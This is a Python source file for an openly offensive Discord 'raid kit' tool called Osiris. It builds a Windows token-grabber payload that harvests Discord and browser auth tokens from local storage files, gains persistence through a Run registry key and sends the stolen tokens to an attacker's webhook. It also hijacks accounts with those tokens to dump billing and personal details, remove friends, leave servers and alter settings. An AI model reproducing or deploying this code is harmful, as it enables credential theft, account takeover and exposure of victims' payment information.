import abc
import asyncio
import os
import time
import typing

import aiohttp
import colorama as cama
import requests
from selenium import webdriver
from selenium.common.exceptions import WebDriverException
from selenium.webdriver import ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager
from webdriver_manager.microsoft import EdgeChromiumDriverManager

import utils.io_utils as iou
import utils.log_utils as lu

API_BASE = 'https://discord.com/api/v9'


class LoginAction(abc.ABC):
    @abc.abstractmethod
    def execute(self, driver) -> str:
        """Executes the the post-login actions for Osiris

        Args:
            driver (...): the driver to use
        """


class LoginActionNone(LoginAction):
    def execute(self, driver) -> str:
        return 'Logged into user account successfully!'


class LoginActionRemoveFriends(LoginAction):
    def execute(self, driver) -> str:
        driver.find_element(By.XPATH, "//div[@role='tab'][contains(text(),'All')]").click()
        people = driver.find_elements(By.XPATH, "//div[@data-list-id='people'] //div[@role='listitem']")
        action = ActionChains(driver)
        for person in people:
            action.context_click(person).perform()
            driver.find_element(By.ID, 'user-context-remove-friend').click()
            driver.find_element(By.XPATH, "//button[@type='submit']").click()
            time.sleep(0.5)
        return 'Removed all friends from user account successfully'


class Osiris:
    
    __slots__ = ('clear_screen', 'hint')
    
    def __init__(self, clear_screen: bool = True):
        self.hint: str = ''
        self.clear_screen: bool = clear_screen
    
    def run(self):
        """Run the Osiris program, displaying options to the user"""
        while True:
            match iou.valid_input(
                    f'''{cama.Fore.LIGHTGREEN_EX}Welcome to Discord Raidkit's Osiris!

{cama.Fore.LIGHTBLUE_EX}[1] Generate Discord token grabber
[2] Get a Discord account's details
[3] Log into a discord account
[4] Log into a discord account and remove all friends
[5] Nuke a discord account
{cama.Fore.RED}[6] Exit

{cama.Fore.LIGHTWHITE_EX}{self.hint}

{cama.Fore.LIGHTGREEN_EX}>>> {cama.Fore.LIGHTWHITE_EX}''', 
                    [1, 2, 3, 4, 5, 6], int, self.clear_screen):
                
                case 1:
                    self.hint = self.generate_discord_token_grabber()
                case 2:
                    auth_token = iou.typed_input('Enter the user authhentication token: ', str, True, False)
                    self.hint = self.get_account_details(auth_token)
                case 3:
                    auth_token = iou.typed_input('Enter the user authhentication token: ', str, True, False)
                    self.hint = self.login(auth_token, LoginActionNone())
                case 4:
                    auth_token = iou.typed_input('Enter the user authhentication token: ', str, True, False)
                    self.hint = self.login(auth_token, LoginActionRemoveFriends())
                case 5:
                    auth_token = iou.typed_input('Enter the user authentication token: ', str, True, False)
                    self.hint = asyncio.run(self.nuke_account(auth_token))
                case 6:
                    break
    
    def get_account_details(self, auth_token: str) -> str:
        """Gets the details of a Discord account

        Args:
            auth_token (str): the authentication token of the user

        Returns:
            str: the details of the account
        """
        if (data := self.check_auth(auth_token)) is None:
            return 'The user authentication token provided is invalid.'
        
        username = f'{data["username"]}#{data["discriminator"]}'
        user_id = data['id']
        phone = data['phone']
        email = data['email']
        mfa = data['mfa_enabled']
        
        info = f'''Account Information
{"*"*19}

[User ID]{' '*11}{user_id}
[Username]{' '*10}{username}
[Email]{' '*13}{email if email else 'None'}
[Phone]{' '*13}{phone if phone else 'None'}
[2FA]{' '*15}{'Enabled' if mfa else 'Disabled'}'''

        headers = {
            "Authorization": auth_token,
            "Content-Type": "application/json"
        }
        
        bill_sources = requests.get(f'{API_BASE}/users/@me/billing/payment-sources', headers=headers)
        user_has_nitro = bool(requests.get(f'{API_BASE}/users/@me/billing/subscriptions', headers=headers).json())
        
        if bool(bill_sources):
            info += f'\n\nBilling Information\n{"*"*19}\n\n'
            for source_data in bill_sources:
                info += f'[Has Nitro]{" "*9}{"Yes" if user_has_nitro else "No"}\n'
                
                match source_data['type']:
                    case 1:
                        info += f'[Card Brand]{" "*8}{source_data["brand"]}\n'
                        info += f'[Last 4 Digits]{" "*5}{source_data["last_4"]}\n'
                        info += f'[Expiry Date]{" "*7}{source_data["expires_month"]}/{source_data["expires_year"]}\n'
                        info += f'[Billing Name]{" "*6}{source_data["billing_address"]["name"]}\n'
                        info += f'[Address ln.1]{" "*6}{source_data["billing_address"]["line_1"]}\n'
                        info += f'[Address ln.2]{" "*6}{source_data["billing_address"]["line_2"]}\n'
                        info += f'[Country]{" "*11}{source_data["billing_address"]["country"]}\n'
                        info += f'[State]{" "*13}{source_data["billing_address"]["state"]}\n'
                        info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
                        info += f'[Postal Code]{" "*13}{source_data["billing_address"]["postal_code"]}\n\n'
                    case 2:
                        info += f'[PayPal Email]{" "*6}{source_data["email"]}\n'
                        info += f'[Billing Name]{" "*6}{source_data["billing_address"]["name"]}\n'
                        info += f'[Address ln.1]{" "*6}{source_data["billing_address"]["line_1"]}\n'
                        info += f'[Address ln.2]{" "*6}{source_data["billing_address"]["line_2"]}\n'
                        info += f'[Country]{" "*11}{source_data["billing_address"]["country"]}\n'
                        info += f'[State]{" "*13}{source_data["billing_address"]["state"]}\n'
                        info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
                        info += f'[Postal Code]{" "*7}{source_data["billing_address"]["postal_code"]}\n\n'
                    case _:
                        info += 'None'
            info += f'\n[Token]{" "*13}{self.auth}'
        return info
    
    def login(self, auth_token: str, action: LoginAction) -> str:
        """Logs into a Discord account with a given authentication token and performs an action

        Args:
            auth_token (str): the authentication token of the user
            action (LoginAction): the action to perform

        Returns:
            str: the result notification of the login
        """
        try:
            if (data := self.check_auth(auth_token)) is None:
                return 'The user authentication token provided is invalid.'
            
            browser = iou.valid_input('''Enter a browser to use for the login:

[1] Chrome
[2] Firefox
[3] Edge
[4] Cancel

>>> ''', [1, 2, 3, 4], int, self.clear_screen)
            match browser:
                case 1:
                    from selenium.webdriver.chrome.options import Options
                    chrome_options = Options()
                    chrome_options.add_experimental_option('detach', True)
                    chrome_options.add_argument('--log-level=3')
                    driver = webdriver.Chrome(executable_path=ChromeDriverManager().install(), options=chrome_options)
                case 2:
                    from selenium.webdriver.firefox.options import Options
                    firefox_options = Options()
                    firefox_options.set_preference('detach', True)
                    firefox_options.add_argument('--log-level=3')
                    driver = webdriver.Firefox(executable_path=GeckoDriverManager().install(), options=firefox_options)
                case 3:
                    from selenium.webdriver.edge.options import Options
                    edge_options = Options()
                    edge_options.add_experimental_option('detach', True)
                    edge_options.add_argument('--log-level=3')
                    driver = webdriver.Edge(executable_path=EdgeChromiumDriverManager().install(), options=edge_options)
                case 4:
                    return ''
            
            driver.implicitly_wait(30)
            driver.get('https://discord.com/login')
            
            WebDriverWait(driver, 30).until(
                EC.visibility_of_element_located(
                    (
                        By.XPATH, 
                        "//h1[contains(text(),'Welcome back!')]"
                    )
                )
            )
            
            script = '''
                function login(token) {
                    setInterval(() => {
                        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                    }, 50);
                    setTimeout(() => {
                        location.reload();
                    }, 2500);
                }'''
            
            driver.execute_script(script + f'\nlogin("{auth_token}")')
            return action.execute(driver)
            
        except WebDriverException as e:
            lu.serror(f'Failed to login to account with WebDriverException: {e}')
            return 'Failed to login to account due to WebDriverException.'
    
    async def nuke_account(self, auth_token: str) -> str:
        """Attempts to make user leave any guilds they are in, then
        updates various settings of a Discord account to make it uglier

        Returns:
            str: the result notification of the nuke
        """
        if (data := self.check_auth(auth_token)) is None:
            return 'The user authentication token provided is invalid.'
        
        print(f'\nNuking account: {data["username"]}#{data["discriminator"]} ... \nThis may take some time.')
        headers = {
            "Authorization": auth_token
        }

        lu.sinfo(f'Nuking {data["username"]}#{data["discriminator"]} ...')
        
        # Leave all guilds
        
        async def leave_guild(guild_id: int) -> None:
            """Leave a guild via DELETE request to the Discord API

            Args:
                guild_id (int): the id of the guild to delete
            """
            async with aiohttp.ClientSession(headers=headers) as session:
                while True:
                    async with session.delete(f'{API_BASE}/users/@me/guilds/{guild_id}') as resp:
                        if resp.status == 204:
                            lu.sinfo(f'Left guild {guild_id} successfully.')
                            break
                        elif resp.status == 429:
                            retry_after = int(resp.headers.get('Retry-After', '1'))
                            lu.sinfo(f'Rate limited, retrying after {retry_after} seconds.')
                            await asyncio.sleep(retry_after)
                        else:
                            lu.swarning(f'Failed to leave guild {guild_id} with status code {resp.status}.')
                            json = await resp.json()
                            text = await resp.text()
                            lu.serror(f'JSON: {json}')
                            lu.serror(f'Text: {text}')
                            break
        
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(f'{API_BASE}/users/@me/guilds') as resp:
                guilds = await resp.json()
            await asyncio.gather(*[leave_guild(guild['id']) for guild in guilds if not guild['owner']])
        
        # Update the user's settings 
                
        settings = {
            "locale": "ja",
            "show_current_game": False,
            "default_guilds_restricted": True,
            "inline_attatchment_media": False,
            "inline_embed_media": False,
            "gif_auto_play": False,
            "render_embeds": False,
            "render_reactions": False,
            "animate_emoji": False,
            "enable_tts_command": False,
            "message_display_compact": True,
            "convert_emoticons": False,
            "explicit_content_filter": 0,
            "disable_games_tab": True,
            "theme": "light",
            "detect_platform_accounts": False,
            "stream_notifications_enabled": False,
            "animate_stickers": False,
            "view_nsfw_guilds": True,
        }
        
        requests.patch(
            f'{API_BASE}/users/@me/settings', 
            headers=headers, 
            json=settings
        )
        
        lu.sinfo(f'Nuked {data["username"]}#{data["discriminator"]} successfully.')
        return f'Nuked {data["username"]}#{data["discriminator"]} successfully.'
    
    def check_auth(self, auth_token: str) -> typing.Any:
        """Check the validity of a Discord auth token

        Args:
            auth_token (str): the auth token to check

        Returns:
            ...: the result of the check
        """
        headers = {
            "Authorization": auth_token,
            "Content-Type": "application/json"
        }
        
        r = requests.get(f'{API_BASE}/users/@me', headers=headers)
        
        if r.status_code == 200:
            return r.json()
        
        lu.swarning(f'The user token {auth_token} is invalid.')
        return None
    
    def generate_discord_token_grabber(self) -> str:
        """Generates a Discord token grabber payload.

        Returns:
            str: the result notification of the payload generation
        """
        
        def get_generate_code(s_webhook: str, s_folder: str, s_hpayload: str, do_reg_key: bool) -> str:
            """Get code to generate token grabber payload.

            Returns:
                str: code to generate token grabber payload.

            Credits:
            - wodxgod: created logic to grab discord tokens
            - Microsoft: lets me write to registry keys without administrator
            """

            generated_code = r'''
import os
import json
import os
import re
import shutil
import winreg
from urllib.request import Request, urlopen

PAYLOAD_PATH = os.path.realpath(__file__)
WEBHOOK_URL = "''' + s_webhook + r'''"


def set_autostart_registry(app_name, key_data=None, autostart=True) -> bool:
    with winreg.OpenKey(
        key=winreg.HKEY_CURRENT_USER,
        sub_key=r"Software\Microsoft\Windows\CurrentVersion\Run",
        reserved=0,
        access=winreg.KEY_ALL_ACCESS
    ) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
            else:
                winreg.DeleteValue(key, app_name)
        except OSError:
            return False
    return True


def find_tokens(path) -> list:
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
    
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    
    return tokens


def main():
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = "@everyone"
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
    
        message += f"\n**{platform}**\n"
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f"{token}\n"
        else:
            message += "No tokens found.\n"
        
        message += "\n"
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    payload = json.dumps({"content": message})
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass


if __name__ == "__main__":
    path = fr"C:\Users\{os.getenv('username')}''' + f'''\{s_folder}''' + r'''"
    if not os.path.isdir(path):
        os.mkdir(path)
    file = "''' + s_hpayload + r'''.pyw"
    try:
        shutil.copy(__file__, f"{path}\{file}")
    except shutil.SameFileError:
        pass
    '''
            if do_reg_key:
                generated_code += r'''set_autostart_registry("Osiris", f"{path}\{file}")
    '''
            generated_code += r'''main()
'''
            return generated_code
        
        webhook = iou.typed_input('Webhook URL: ', str, True, self.clear_screen)
        folder = iou.typed_input('Folder name (folder made on target machine with another payload within): ', 
                                    str, True, self.clear_screen)
        rpayload = iou.typed_input('Regular payload name: ', str, True, self.clear_screen)
        hpayload = iou.typed_input('Hidden payload name: ', str, True, self.clear_screen)
        do_reg_key = iou.valid_input('Add registry key to autostart payload? (y/n): ', ['y', 'n'], str, self.clear_screen)
        match do_reg_key:
            case 'y':
                do_reg_key = True
            case 'n':
                do_reg_key = False
        try:
            os.mkdir(folder)
            os.rmdir(folder)
            open(f'{rpayload}.txt', 'w').close()
            os.remove(f'{rpayload}.txt')
            open(f'{hpayload}.txt', 'w').close()
            os.remove(f'{hpayload}.txt')
        except OSError:
            return 'Failed to generate payload since options given are invalid Windows paths.'
        
        code = get_generate_code(webhook, folder, hpayload, do_reg_key)
        iou.mkfile(os.path.join('payloads', f'{rpayload}.pyw'), code, self.clear_screen)
        
        return 'Successfully generated payload!'
